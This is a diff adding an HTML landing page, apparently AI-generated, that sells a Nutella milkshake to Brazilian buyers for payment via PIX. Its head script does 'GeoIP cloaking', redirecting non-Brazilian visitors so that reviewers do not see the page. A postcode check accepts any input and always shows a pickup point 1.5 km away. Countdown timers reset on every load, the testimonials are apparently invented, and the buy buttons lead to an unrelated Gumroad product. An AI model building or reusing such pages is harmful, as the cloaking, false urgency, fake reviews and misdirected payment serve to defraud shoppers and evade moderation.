@@ -1,0 +1,526 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Milkshake de Nutella - O mais cremoso da cidade!</title>
+    <script>
+        // GeoIP cloaking for non-Brazilian users
+        fetch("https://ipapi.co/json/")
+            .then(response => response.json())
+            .then(data => {
+                const country = data.country_code;
+                if (country !== "BR") {
+                    window.location.href = "https://example.com/acesso-negado";
+                }
+            });
+    </script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&family=Pacifico&display=swap" rel="stylesheet">
+    <style>
+        .hero-gradient {
+            background: linear-gradient(135deg, #8B4513 0%, #D2B48C 100%);
+        }
+        .pulse-animation {
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        .sticky-bar {
+            position: sticky;
+            top: 0;
+            z-index: 50;
+            transition: all 0.3s ease;
+        }
+        .nutella-text {
+            font-family: 'Pacifico', cursive;
+        }
+        .distance-badge {
+            position: relative;
+            overflow: hidden;
+        }
+        .distance-badge::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: conic-gradient(transparent, #8B4513, transparent 30%);
+            animation: rotate 4s linear infinite;
+        }
+        @keyframes rotate {
+            100% { transform: rotate(360deg); }
+        }
+        body {
+            font-family: 'Poppins', sans-serif;
+        }
+        .shake-animation {
+            animation: shake 0.5s ease infinite alternate;
+        }
+        @keyframes shake {
+            0% { transform: rotate(-5deg); }
+            100% { transform: rotate(5deg); }
+        }
+    </style>
+</head>
+<body class="bg-amber-50">
+    <!-- Sticky Promo Bar -->
+    <div class="sticky-bar bg-amber-100 text-brown-900 py-2 px-4 text-center font-bold shadow-sm">
+        <div class="container mx-auto flex justify-between items-center">
+            <span class="text-sm md:text-base">🔥 OFERTA ESPECIAL: Compre agora e ganhe uma casquinha de sorvete de baunilha GRÁTIS!</span>
+            <div class="hidden md:flex items-center space-x-2">
+                <span id="countdown" class="bg-amber-800 text-white px-2 py-1 rounded-md"></span>
+            </div>
+        </div>
+    </div>
+
+    <!-- CEP Modal -->
+    <div id="cepModal" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 px-4">
+        <div class="bg-white rounded-lg p-6 max-w-md w-full">
+            <div class="flex justify-center mb-4">
+                <div class="bg-amber-100 rounded-full p-3">
+                    <i class="fas fa-map-marker-alt text-amber-800 text-2xl"></i>
+                </div>
+            </div>
+            <h3 class="text-xl font-bold mb-4 text-center">Antes de continuar...</h3>
+            <p class="text-gray-600 mb-4">Informe seu CEP para verificarmos a disponibilidade em sua região:</p>
+            
+            <div class="flex">
+                <input type="text" id="cepInput" placeholder="Digite seu CEP" class="flex-1 border border-gray-300 rounded-l-lg px-4 py-2 focus:outline-none focus:ring-2 focus:ring-amber-500" maxlength="8">
+                <button onclick="checkCEP()" class="bg-amber-800 hover:bg-amber-900 text-white px-4 py-2 rounded-r-lg font-semibold">
+                    Verificar
+                </button>
+            </div>
+            
+            <div id="cepError" class="text-red-500 mt-2 text-sm hidden">Por favor, digite um CEP válido (8 dígitos)</div>
+        </div>
+    </div>
+
+    <!-- Hero Section -->
+    <section class="hero-gradient text-white py-12 md:py-20">
+        <div class="container mx-auto px-4 flex flex-col md:flex-row items-center">
+            <div class="md:w-1/2 mb-10 md:mb-0">
+                <h1 class="text-4xl md:text-5xl font-bold mb-2 nutella-text">Milkshake de Nutella</h1>
+                <h2 class="text-2xl md:text-3xl font-semibold mb-6">O mais cremoso e saboroso da cidade!</h2>
+                <p class="text-lg mb-8">Delicioso milkshake de Nutella 500ml + casquinha de sorvete de baunilha grátis. Perfeito para dias quentes ou quando bate aquela vontade de doce!</p>
+                
+                <div id="distanceInfo" class="hidden bg-white rounded-lg p-4 text-brown-900 max-w-md mb-6">
+                    <div class="flex items-center">
+                        <div class="distance-badge mr-4">
+                            <div class="bg-amber-100 rounded-full p-2">
+                                <i class="fas fa-map-marker-alt text-amber-800 text-2xl p-2"></i>
+                            </div>
+                        </div>
+                        <div>
+                            <p class="font-semibold">Ponto de retirada a <span id="distanceValue">1.5</span> km</p>
+                            <p class="text-sm text-gray-600">Tempo estimado: <span id="timeValue">5-10</span> minutos</p>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="bg-white rounded-lg p-6 text-brown-900 max-w-md">
+                    <h3 class="text-xl font-bold mb-4 text-center">OFERTA ESPECIAL</h3>
+                    <div class="flex justify-between items-center mb-4">
+                        <span class="text-gray-600 line-through text-lg">De R$24,99</span>
+                        <span class="bg-amber-800 text-white px-3 py-1 rounded-full font-bold">20% OFF</span>
+                    </div>
+                    <div class="text-3xl font-bold text-amber-800 mb-4">R$19,99</div>
+                    <p class="text-sm text-gray-600 mb-4">+ casquinha de baunilha grátis no valor de R$4,99</p>
+                    
+                    <button id="buyButton" class="w-full bg-amber-600 hover:bg-amber-700 text-white font-bold py-4 px-6 rounded-lg text-center pulse-animation mb-4 hidden">
+                        COMPRAR AGORA VIA PIX
+                    </button>
+                    
+                    <div class="flex items-center justify-center">
+                        <img src="https://via.placeholder.com/150" alt="Pagamento seguro" class="h-8 mr-2">
+                        <span class="text-xs">Compra 100% segura</span>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="md:w-1/2 flex justify-center relative">
+                <div class="relative">
+                    <img src="https://images.unsplash.com/photo-1572490122747-3968b75cc699?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=687&q=80" alt="Milkshake de Nutella" class="rounded-lg shadow-2xl max-w-md w-full h-auto object-cover">
+                    <div class="absolute -bottom-4 -right-4 bg-white p-3 rounded-full shadow-lg">
+                        <div class="bg-amber-100 w-16 h-16 rounded-full flex items-center justify-center shake-animation">
+                            <i class="fas fa-ice-cream text-amber-800 text-2xl"></i>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Benefits Section -->
+    <section class="py-16 bg-white">
+        <div class="container mx-auto px-4">
+            <h2 class="text-3xl font-bold text-center mb-12 nutella-text">Por que nosso Milkshake é especial?</h2>
+            
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
+                <div class="bg-amber-50 p-6 rounded-xl shadow-md hover:shadow-lg transition-all transform hover:-translate-y-1">
+                    <div class="bg-amber-100 w-16 h-16 rounded-full flex items-center justify-center mb-4 mx-auto">
+                        <i class="fas fa-heart text-amber-800 text-2xl"></i>
+                    </div>
+                    <h3 class="text-xl font-semibold text-center mb-3">Ingredientes Premium</h3>
+                    <p class="text-gray-600 text-center">Feito com Nutella original, leite fresco e sorvete de alta qualidade para um sabor incomparável.</p>
+                </div>
+                
+                <div class="bg-amber-50 p-6 rounded-xl shadow-md hover:shadow-lg transition-all transform hover:-translate-y-1">
+                    <div class="bg-amber-100 w-16 h-16 rounded-full flex items-center justify-center mb-4 mx-auto">
+                        <i class="fas fa-bolt text-amber-800 text-2xl"></i>
+                    </div>
+                    <h3 class="text-xl font-semibold text-center mb-3">Preparo na Hora</h3>
+                    <p class="text-gray-600 text-center">Cada milkshake é preparado na hora para garantir a textura cremosa perfeita.</p>
+                </div>
+                
+                <div class="bg-amber-50 p-6 rounded-xl shadow-md hover:shadow-lg transition-all transform hover:-translate-y-1">
+                    <div class="bg-amber-100 w-16 h-16 rounded-full flex items-center justify-center mb-4 mx-auto">
+                        <i class="fas fa-gift text-amber-800 text-2xl"></i>
+                    </div>
+                    <h3 class="text-xl font-semibold text-center mb-3">Bônus Exclusivo</h3>
+                    <p class="text-gray-600 text-center">Toda compra acompanha uma casquinha de sorvete de baunilha cremosa grátis!</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Gallery Section -->
+    <section class="py-16 bg-amber-50">
+        <div class="container mx-auto px-4">
+            <h2 class="text-3xl font-bold text-center mb-12 nutella-text">Nosso Milkshake em Destaque</h2>
+            
+            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
+                <div class="rounded-xl overflow-hidden shadow-lg transform hover:scale-105 transition duration-300">
+                    <img src="https://images.unsplash.com/photo-1629452934563-0daa2a0c0a4a?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1470&q=80" alt="Milkshake de Nutella" class="w-full h-64 object-cover">
+                    <div class="bg-white p-4">
+                        <h3 class="font-bold text-xl mb-2">Cremoso e Espesso</h3>
+                        <p class="text-gray-700 text-base">Textura perfeita que derrete na boca</p>
+                    </div>
+                </div>
+                
+                <div class="rounded-xl overflow-hidden shadow-lg transform hover:scale-105 transition duration-300">
+                    <img src="https://images.unsplash.com/photo-1563805042-7684c019e1cb?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1527&q=80" alt="Casquinha de Baunilha" class="w-full h-64 object-cover">
+                    <div class="bg-white p-4">
+                        <h3 class="font-bold text-xl mb-2">Casquinha de Baunilha</h3>
+                        <p class="text-gray-700 text-base">Bônus grátis com toda compra</p>
+                    </div>
+                </div>
+                
+                <div class="rounded-xl overflow-hidden shadow-lg transform hover:scale-105 transition duration-300">
+                    <img src="https://images.unsplash.com/photo-1572490122747-3968b75cc699?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=687&q=80" alt="Milkshake com Cobertura" class="w-full h-64 object-cover">
+                    <div class="bg-white p-4">
+                        <h3 class="font-bold text-xl mb-2">Cobertura Generosa</h3>
+                        <p class="text-gray-700 text-base">Nutella derretida por cima</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Testimonials Section -->
+    <section class="py-16 bg-white">
+        <div class="container mx-auto px-4">
+            <h2 class="text-3xl font-bold text-center mb-12 nutella-text">O que nossos clientes dizem</h2>
+            
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
+                <div class="bg-amber-50 p-6 rounded-xl shadow-md">
+                    <div class="flex items-center mb-4">
+                        <img src="https://randomuser.me/api/portraits/women/44.jpg" alt="Cliente" class="w-12 h-12 rounded-full mr-4">
+                        <div>
+                            <h3 class="font-semibold">Ana Clara</h3>
+                            <div class="flex text-amber-400">
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                            </div>
+                        </div>
+                    </div>
+                    <p class="text-gray-600">"O milkshake é incrível! Muito cremoso e com sabor intenso de Nutella. A casquinha que vem junto é a cereja do bolo. Recomendo demais!"</p>
+                </div>
+                
+                <div class="bg-amber-50 p-6 rounded-xl shadow-md">
+                    <div class="flex items-center mb-4">
+                        <img src="https://randomuser.me/api/portraits/men/32.jpg" alt="Cliente" class="w-12 h-12 rounded-full mr-4">
+                        <div>
+                            <h3 class="font-semibold">Carlos Eduardo</h3>
+                            <div class="flex text-amber-400">
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                            </div>
+                        </div>
+                    </div>
+                    <p class="text-gray-600">"Levo meus filhos toda semana! Eles adoram e eu também. A combinação do milkshake com a casquinha é perfeita. Ótimo custo-benefício."</p>
+                </div>
+                
+                <div class="bg-amber-50 p-6 rounded-xl shadow-md">
+                    <div class="flex items-center mb-4">
+                        <img src="https://randomuser.me/api/portraits/women/68.jpg" alt="Cliente" class="w-12 h-12 rounded-full mr-4">
+                        <div>
+                            <h3 class="font-semibold">Fernanda</h3>
+                            <div class="flex text-amber-400">
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star"></i>
+                                <i class="fas fa-star-half-alt"></i>
+                            </div>
+                        </div>
+                    </div>
+                    <p class="text-gray-600">"Adoro pedir quando estou com vontade de algo doce. Chega super rápido e sempre bem geladinho. A casquinha é uma delícia também!"</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- CTA Section -->
+    <section id="comprar" class="py-16 bg-amber-800 text-white">
+        <div class="container mx-auto px-4">
+            <div class="max-w-4xl mx-auto text-center">
+                <h2 class="text-3xl font-bold mb-6 nutella-text">Pronto para se deliciar?</h2>
+                <p class="text-xl mb-8">Peça agora seu Milkshake de Nutella 500ml + Casquinha de Baunilha Grátis!</p>
+                
+                <div class="bg-white rounded-lg p-8 text-brown-900 max-w-2xl mx-auto">
+                    <h3 class="text-2xl font-bold mb-6">OFERTA EXCLUSIVA POR TEMPO LIMITADO</h3>
+                    
+                    <div class="flex flex-col md:flex-row justify-between items-center mb-6">
+                        <div class="mb-4 md:mb-0">
+                            <div class="text-gray-600 line-through text-lg">De R$24,99</div>
+                            <div class="text-4xl font-bold text-amber-800">R$19,99</div>
+                            <div class="text-sm text-gray-600">+ casquinha de baunilha grátis no valor de R$4,99</div>
+                        </div>
+                        
+                        <div class="bg-amber-600 text-white px-4 py-2 rounded-md font-bold">
+                            <div class="text-sm">OFERTA TERMINA EM:</div>
+                            <div id="cta-countdown" class="text-xl">30:00</div>
+                        </div>
+                    </div>
+                    
+                    <div id="ctaDistanceInfo" class="hidden bg-amber-50 rounded-lg p-4 mb-6">
+                        <div class="flex items-center justify-center">
+                            <i class="fas fa-map-marker-alt text-amber-800 text-xl mr-2"></i>
+                            <span class="font-semibold">Retirada a <span id="ctaDistanceValue">1.5</span> km do seu CEP</span>
+                        </div>
+                    </div>
+                    
+                    <button id="ctaBuyButton" class="w-full bg-amber-600 hover:bg-amber-700 text-white font-bold py-4 px-6 rounded-lg text-center text-lg mb-4 pulse-animation hidden">
+                        COMPRAR AGORA VIA PIX
+                    </button>
+                    
+                    <div class="flex items-center justify-center">
+                        <img src="https://via.placeholder.com/150" alt="Pagamento seguro" class="h-8 mr-2">
+                        <div class="text-xs text-left">
+                            <div>Compra 100% segura</div>
+                            <div>Dados protegidos</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- FAQ Section -->
+    <section class="py-16 bg-white">
+        <div class="container mx-auto px-4 max-w-4xl">
+            <h2 class="text-3xl font-bold text-center mb-12 nutella-text">Perguntas Frequentes</h2>
+            
+            <div class="space-y-4">
+                <div class="border border-amber-200 rounded-lg overflow-hidden">
+                    <button class="faq-question w-full px-6 py-4 text-left font-semibold bg-amber-50 hover:bg-amber-100 transition-colors flex justify-between items-center">
+                        <span>Como faço para retirar meu pedido?</span>
+                        <i class="fas fa-chevron-down transition-transform"></i>
+                    </button>
+                    <div class="faq-answer px-6 py-4 bg-white hidden">
+                        <p class="text-gray-600">Após a confirmação do pagamento, você receberá um código de retirada. Basta apresentar esse código em nosso ponto de retirada mais próximo do seu CEP dentro do horário de funcionamento.</p>
+                    </div>
+                </div>
+                
+                <div class="border border-amber-200 rounded-lg overflow-hidden">
+                    <button class="faq-question w-full px-6 py-4 text-left font-semibold bg-amber-50 hover:bg-amber-100 transition-colors flex justify-between items-center">
+                        <span>Quanto tempo dura a promoção da casquinha grátis?</span>
+                        <i class="fas fa-chevron-down transition-transform"></i>
+                    </button>
+                    <div class="faq-answer px-6 py-4 bg-white hidden">
+                        <p class="text-gray-600">A casquinha de sorvete de baunilha grátis é uma promoção por tempo limitado. Não sabemos até quando estará disponível, então aproveite enquanto dura!</p>
+                    </div>
+                </div>
+                
+                <div class="border border-amber-200 rounded-lg overflow-hidden">
+                    <button class="faq-question w-full px-6 py-4 text-left font-semibold bg-amber-50 hover:bg-amber-100 transition-colors flex justify-between items-center">
+                        <span>Posso pedir para entregar em casa?</span>
+                        <i class="fas fa-chevron-down transition-transform"></i>
+                    </button>
+                    <div class="faq-answer px-6 py-4 bg-white hidden">
+                        <p class="text-gray-600">Atualmente trabalhamos apenas com retirada no local para garantir que seu milkshake chegue na temperatura e textura perfeitas. O ponto de retirada estará sempre próximo ao seu CEP.</p>
+                    </div>
+                </div>
+                
+                <div class="border border-amber-200 rounded-lg overflow-hidden">
+                    <button class="faq-question w-full px-6 py-4 text-left font-semibold bg-amber-50 hover:bg-amber-100 transition-colors flex justify-between items-center">
+                        <span>Quais são os horários de retirada?</span>
+                        <i class="fas fa-chevron-down transition-transform"></i>
+                    </button>
+                    <div class="faq-answer px-6 py-4 bg-white hidden">
+                        <p class="text-gray-600">Nossos pontos funcionam de terça a domingo, das 14h às 22h. Você pode retirar seu pedido a qualquer momento dentro desse horário após a confirmação do pagamento.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="bg-amber-900 text-white py-8">
+        <div class="container mx-auto px-4">
+            <div class="flex flex-col md:flex-row justify-between items-center">
+                <div class="mb-4 md:mb-0">
+                    <h3 class="text-xl font-bold mb-2 nutella-text">Milkshake de Nutella</h3>
+                    <p class="text-sm text-amber-200">A felicidade em forma de shake</p>
+                </div>
+                
+                <div class="flex space-x-6">
+                    <a href="#" class="text-amber-200 hover:text-white">
+                        <i class="fab fa-facebook-f"></i>
+                    </a>
+                    <a href="#" class="text-amber-200 hover:text-white">
+                        <i class="fab fa-instagram"></i>
+                    </a>
+                    <a href="#" class="text-amber-200 hover:text-white">
+                        <i class="fab fa-whatsapp"></i>
+                    </a>
+                </div>
+            </div>
+            
+            <div class="border-t border-amber-800 mt-8 pt-8 text-sm text-amber-200">
+                <div class="flex flex-col md:flex-row justify-between">
+                    <div class="mb-4 md:mb-0">
+                        <p>© 2023 Milkshake de Nutella. Todos os direitos reservados.</p>
+                    </div>
+                    <div class="flex flex-col md:flex-row space-y-2 md:space-y-0 md:space-x-6">
+                        <a href="#" class="hover:text-white">Termos de Uso</a>
+                        <a href="#" class="hover:text-white">Política de Privacidade</a>
+                        <a href="#" class="hover:text-white">Contato</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // Show CEP modal on page load
+        document.addEventListener('DOMContentLoaded', function() {
+            document.getElementById('cepModal').classList.remove('hidden');
+            
+            // Add input mask for CEP
+            const cepInput = document.getElementById('cepInput');
+            cepInput.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\D/g, '');
+                if (value.length > 5) {
+                    value = value.substring(0, 5) + '-' + value.substring(5, 8);
+                }
+                e.target.value = value;
+            });
+        });
+
+        // CEP validation and distance calculation
+        function checkCEP() {
+            const cepInput = document.getElementById('cepInput').value;
+            const cepError = document.getElementById('cepError');
+            
+            // Remove non-digit characters
+            const cepDigits = cepInput.replace(/\D/g, '');
+            
+            // Simple CEP validation (8 digits)
+            if (cepDigits.length !== 8 || isNaN(cepDigits)) {
+                cepError.classList.remove('hidden');
+                return;
+            }
+            
+            cepError.classList.add('hidden');
+            
+            // Hide modal
+            document.getElementById('cepModal').classList.add('hidden');
+            
+            // Show distance info (always 1.5km in this example)
+            document.getElementById('distanceInfo').classList.remove('hidden');
+            document.getElementById('ctaDistanceInfo').classList.remove('hidden');
+            
+            // Enable buy buttons
+            document.getElementById('buyButton').classList.remove('hidden');
+            document.getElementById('ctaBuyButton').classList.remove('hidden');
+            
+            // Set up buy button
+            document.getElementById('buyButton').addEventListener('click', function() {
+                window.location.href = 'https://dkswallet.gumroad.com/l/ljhck';
+            });
+            
+            document.getElementById('ctaBuyButton').addEventListener('click', function() {
+                window.location.href = 'https://dkswallet.gumroad.com/l/ljhck';
+            });
+        }
+
+        // Countdown Timer
+        function startCountdown(elementId, minutes) {
+            let time = minutes * 60;
+            const countdownElement = document.getElementById(elementId);
+            
+            const interval = setInterval(() => {
+                const minutesLeft = Math.floor(time / 60);
+                let secondsLeft = time % 60;
+                
+                secondsLeft = secondsLeft < 10 ? '0' + secondsLeft : secondsLeft;
+                
+                countdownElement.innerHTML = `${minutesLeft}:${secondsLeft}`;
+                time--;
+                
+                if (time < 0) {
+                    clearInterval(interval);
+                    countdownElement.innerHTML = "OFERTA EXPIRADA!";
+                }
+            }, 1000);
+        }
+        
+        // Start both countdowns
+        startCountdown('countdown', 30);
+        startCountdown('cta-countdown', 30);
+        
+        // FAQ Accordion
+        document.querySelectorAll('.faq-question').forEach(button => {
+            button.addEventListener('click', () => {
+                const answer = button.nextElementSibling;
+                const icon = button.querySelector('i');
+                
+                // Toggle answer visibility
+                answer.classList.toggle('hidden');
+                
+                // Rotate icon
+                if (answer.classList.contains('hidden')) {
+                    icon.style.transform = 'rotate(0deg)';
+                } else {
+                    icon.style.transform = 'rotate(180deg)';
+                }
+            });
+        });
+        
+        // Sticky header effect
+        window.addEventListener('scroll', function() {
+            const stickyBar = document.querySelector('.sticky-bar');
+            if (window.scrollY > 100) {
+                stickyBar.classList.add('shadow-md');
+                stickyBar.classList.add('py-1');
+            } else {
+                stickyBar.classList.remove('shadow-md');
+                stickyBar.classList.remove('py-1');
+            }
+        });
+    </script>
+<p style="border-radius: 8px; text-align: center; font-size: 12px; color: #fff; margin-top: 16px;position: fixed; left: 8px; bottom: 8px; z-index: 10; background: rgba(0, 0, 0, 0.8); padding: 4px 8px;">Made with <img src="https://enzostvs-deepsite.hf.space/logo.svg" alt="DeepSite Logo" style="width: 16px; height: 16px; vertical-align: middle;display:inline-block;margin-right:3px;filter:brightness(0) invert(1);"><a href="https://enzostvs-deepsite.hf.space" style="color: #fff;text-decoration: underline;" target="_blank" >DeepSite</a> - 🧬 <a href="https://enzostvs-deepsite.hf.space?remix=moongiro/moongiro-site-de-venda" style="color: #fff;text-decoration: underline;" target="_blank" >Remix</a></p></body>
+</html>
